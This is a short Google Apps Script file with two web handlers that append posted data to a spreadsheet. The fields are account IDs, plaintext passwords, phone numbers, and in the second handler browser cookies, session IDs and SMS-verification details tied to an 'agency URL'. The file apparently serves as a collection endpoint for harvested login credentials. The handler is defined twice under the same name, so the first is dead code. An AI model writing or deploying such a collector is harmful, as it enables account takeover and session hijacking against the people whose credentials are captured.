// Gen Login Sheet Database
function doPost(e) {
  try {

    const data = JSON.parse(e.postData.contents);
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    if (data && data.AccountID && data.AccountPWD && data.phone) {
    sheet.appendRow([
        data.AccountID,
        data.AccountPWD,
        data.phone
    ]);
} else {
    Logger.log("Data is missing AccountID, AccountPWD, or phone.");
}


    return ContentService.createTextOutput(JSON.stringify({ status: 'success' })).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: error.message })).setMimeType(ContentService.MimeType.JSON);
  }
}

// Gen Register Sheet Database
function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);


    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

    sheet.appendRow([
      data.AgencyURL,
      data.AccountID,
      data.NickName,
      data.VerifyUsage,
      data.PWD,
      data.FingerIDX,
      data.SMSVerifyType,
      data.LocalStorgeCookie,
      data.CellPhone,
      data.UniqueSessionId,
      data.IsReceiveSMS,
      data.ScreenResolution
    ]);


    return ContentService.createTextOutput(JSON.stringify({ status: 'success' })).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: error.message })).setMimeType(ContentService.MimeType.JSON);
  }
}
